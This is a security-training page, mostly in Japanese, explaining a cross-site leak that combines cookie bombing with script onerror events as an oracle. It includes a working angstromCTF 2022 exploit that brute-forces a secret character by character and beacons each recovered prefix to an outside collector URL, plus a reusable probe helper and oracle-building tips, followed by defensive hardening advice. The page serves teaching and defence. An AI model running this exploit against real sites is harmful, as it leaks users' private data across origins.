# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 標的オリジンに対して被害者のブラウザに多数/大容量のCookieを詰め込み、以降のリクエストがサーバーやリクエストの制限（リクエストヘッダサイズ、リダイレクト時のURL長など）に達するようにする。
- Error-event oracle: <script>（または他のサブリソース）でクロスオリジンのエンドポイントをプローブし、onload vs onerror で状態を判別する。

High level idea
- テストしたい2つの状態（例: 検索 “hit” vs “miss”）で挙動が異なるターゲットエンドポイントを見つける。
- “hit” パスが大きなリダイレクトチェーンや長いURLを引き起こすようにし、”miss” パスは短いままにしておく。多数のCookieでリクエストヘッダを膨らませ、”hit” パスだけがサーバーの制限を超えてHTTPエラー（例: 431/414/400）を発生させるようにする。そのエラーにより onerror が発火し、XS-Search のオラクルになる。

When does this work
- 被害者のブラウザに対してターゲットへCookieを送らせることができる（例: Cookieが SameSite=None になっている、または popup の window.open を介した first-party コンテキストで設定できる）。
- 任意のCookieを設定できるようなアプリ機能を悪用できる（例: 制御可能な入力名/値を Set-Cookie に変換する “save preference” エンドポイント）、または認証後のリダイレクトで攻撃者制御のデータをURLに組み込める。
- サーバーが2つの状態で異なる反応を示し、ヘッダ/URLを膨らませることで一方の状態が制限を超えてエラー応答を返し、onerror をトリガーする。

Note on server errors used as the oracle
- Cookieがリクエストヘッダを膨らませた場合、一般的に 431 Request Header Fields Too Large が返されることが多い。長いリクエスト先では 414 URI Too Long やサーバ固有の 400 が返されることがある。これらはいずれもサブリソースの読み込み失敗になり onerror が発火する。 [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
なぜポップアップ（window.open）か？
- 近年のブラウザは third-party cookies をますますブロックします。ターゲットに top-level window を開くことで cookies が first‑party になり、ターゲットからの Set-Cookie レスポンスが維持されます。これにより、third‑party cookie restrictions があっても cookie-bomb ステップが可能になります。

汎用の probing ヘルパー
既にターゲットオリジン（first-party）に多数の cookies を設定する方法を持っている場合、成功/失敗で異なるネットワーク結果（status/MIME/redirect）を生じる任意のエンドポイントに対して、この最小限の oracle を再利用できます:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
オラクル構築のヒント
- “ポジティブ”状態を重くする: 判定が真のときのみ追加のredirectをチェーンする、またはリダイレクト先のURLを制限のないユーザー入力を反映するようにして、推測したプレフィックスに応じて増加させる。
- ヘッダを膨らませる: “heavy”パスで一貫したエラーが観測されるまでcookie bombingを繰り返す。サーバは一般的にヘッダサイズに上限を設けており、多数のcookieがあるとより早く失敗する。
- 安定化: 複数の並列cookie set operationsを発生させ、タイミングやキャッシュのノイズを平均化するために繰り返しプローブする。

関連する XS-Search トリック
- URL長ベースのオラクル（cookie不要）は、非常に長いリクエストターゲットを強制できる場合に組み合わせたり代わりに使ったりできる:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

防御とハードニング
- 成功/失敗レスポンスを区別できなくする:
- 状態間で条件付きのリダイレクトやレスポンスサイズの大きな差を避ける。状態に関係なく同じステータス、同じ Content-Type、類似した本文長を返すこと。
- クロスサイトのサブリソースプローブをブロックする:
- SameSite cookies: 機密性の高いcookieは SameSite=Lax または Strict に設定し、<script src> のようなサブリソースリクエストで送信されないようにする。認証トークンには可能なら Strict を推奨。
- Fetch Metadata: Resource Isolation Policy を適用してクロスサイトのサブリソース読み込みを拒否する（例: Sec-Fetch-Site != same-origin/same-site の場合）。
- Cross-Origin-Resource-Policy (CORP): クロスオリジンのサブリソースとして埋め込む意図のないエンドポイントには CORP: same-origin（少なくとも same-site）を設定する。
- X-Content-Type-Options: JSON/HTMLエンドポイントでは nosniff を設定し正しい Content-Type を返すことで、スクリプトとしてロードされる挙動の問題を回避する。
- ヘッダ/URLの増幅を抑える:
- 設定されるcookieの数/サイズを制限する。任意のフォームフィールドを Set-Cookie に変換する機能はサニタイズする。
- リダイレクトで反映されるデータを正規化または切り詰める。攻撃者制御の長い文字列を Location URLs に埋め込まない。
- サーバの制限を一貫させ、失敗時は均一に扱う（ある分岐だけ特別なエラーページを返すのを避ける）。

注記
- このクラスの攻撃は広く “Error Events” XS-Leaks として議論されている。cookie-bomb ステップはサーバ制限を超えるのを一つの分岐だけに起こさせる便利な方法であり、信頼できるブール型オラクルを生成するに過ぎない。



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
